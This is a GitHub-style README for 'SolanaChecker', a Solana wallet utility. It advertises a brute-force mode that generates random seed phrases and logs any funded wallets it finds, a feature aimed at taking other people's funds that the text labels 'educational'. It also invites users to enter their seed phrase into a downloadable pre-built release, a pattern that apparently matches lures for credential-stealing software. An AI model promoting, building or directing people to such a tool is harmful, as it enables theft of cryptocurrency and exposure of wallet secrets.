# Solana Wallet Balance Finder: Quickly Check Your SOL Holdings with SolanaChecker

**SolanaChecker** is your all-in-one tool for interacting with the Solana blockchain, offering essential functions for managing and understanding your Solana wallets. This program simplifies the process of checking balances, analyzing transactions, and exploring the Solana network, making it easy to keep track of your SOL and other assets.

<p align="left">
    <img src="/config/config.webp" />
</p>

## Key Features for Finding Solana Wallet Balances

1.  **Check Solana Address Balance:** *This is the core function for finding your Solana balance.* Quickly and easily check the current SOL balance of any specified Solana address. This allows you to immediately see how much SOL you hold in any of your wallets.

<p align="left">
    <img src="/config/plate.webp" />
</p>

2.  **Check Solana Tokens for Fraud:** Protect your investments by assessing the security of Solana tokens. This feature analyzes token characteristics and metadata to help you avoid potentially fraudulent projects and make informed investment decisions.

<p align="left">
    <img src="/config/instance.webp" />
</p>

3.  **Track Solana Addresses (Monitor Transactions):** Receive notifications about activity on your wallets through a Telegram bot. Stay informed of fund movements in real-time, which is especially useful for monitoring transactions and identifying potential risks or opportunities.

4.  **Wallet Data from Mnemonic Phrase:** Retrieve wallet data (private key, address, and balance) from your mnemonic phrase (seed phrase). *This allows you to verify the balance of a wallet using your seed phrase*.

<p align="left">
    <img src="/config/gap.webp" />
</p>

5.  **Generate a Single Solana Wallet:** Quickly generate a new Solana wallet with a unique private key and address. This can be useful for creating test wallets or managing multiple accounts.

<p align="left">
    <img src="/config/thick.webp" />
</p>

6.  **Generation Solana Wallets and Check Balance (Simulated Search):** *For educational purposes only,* this feature simulates a brute-force process of generating random seed phrases and checking the resulting addresses for balances. *This demonstrates the importance of strong seed phrases*. If a wallet with a balance is found, the data is written to 'found-wallets.txt' and, if configured, a Telegram notification is sent.

<p align="left">
    <img src="/config/patch.webp" />
</p>

## Setting Up Telegram Notifications

Configure Telegram notifications to receive alerts when your tracked Solana wallets experience activity. To enable this, input your [bot token](https://core.telegram.org/bots/tutorial#obtain-your-bot-token) and your [chat_id](https://t.me/getmyid_bot) in the 'telegram-settings.txt' file.

## Getting Started: Download or Build

You can download a pre-compiled build of SolanaChecker from [Release](../../releases) or build the project yourself. *Building the project from source allows for verification and customization*.

## Building the Project: Ensure Trust and Security

Building the project from the source code is highly recommended. This lets you verify that the code is doing what you expect it to do.

### Installing Dependencies Using vcpkg:

1.  Install **vcpkg** by following the instructions on the [official page](https://github.com/microsoft/vcpkg) if you don’t have it installed.

2.  Add vcpkg to your system PATH.

3.  Install the required dependencies using the following commands:

    -   Install **OpenSSL**:
        ```bash
        vcpkg install openssl
        ```

    -   Install **nlohmann-json**:
        ```bash
        vcpkg install nlohmann-json
        ```

    -   Install **Crypto++**:
        ```bash
        vcpkg install cryptopp
        ```

    -   Install **libsodium**:
        ```bash
        vcpkg install libsodium
        ```

4.  Once the dependencies are installed, build the project using Visual Studio or another C++ compiler.

### Building via Visual Studio:

1.  Open the project solution in Visual Studio.
2.  Ensure **vcpkg** is correctly integrated with your development environment.
3.  Click **Build** -> **Build Solution**.
4.  The executable will be in the `bin` folder.

### Building with Another C++ Compiler:

1.  Make sure all dependencies are installed via **vcpkg**.
2.  Compile the project using a command similar to this (adapt to your compiler):

    ```bash
    g++ -o solanachecker main.cpp -lssl -lcrypto -lsodium -lcryptopp -std=c++17
    ```

## Command Line: Finding and Monitoring Balances

Use these command-line arguments to effectively find and monitor Solana wallet balances:

1.  **-s / -search**: Start the brute-force wallet search (use for educational purposes or with explicit consent only).
2.  **-t / -track (ADDRESS)**: Track a specific address and receive Telegram notifications.
3.  **-g / -gen (NUMBER)**: Generate a specified number of Solana wallets.
4.  **-m / -mnemonic (MNEMONIC)**: Get wallet information using a mnemonic phrase.
5.  **-b / -balance (ADDRESS)**: *Find and display the Solana balance of a given address.*

## Notes

-   Use this program responsibly and ethically. The "search" function should be used for educational purposes only.
-   All cryptocurrency activities carry risks. Protect your wallets, seed phrases, and data.

## License

This project is licensed under the [MIT License](/LICENSE).







Update: link is reachable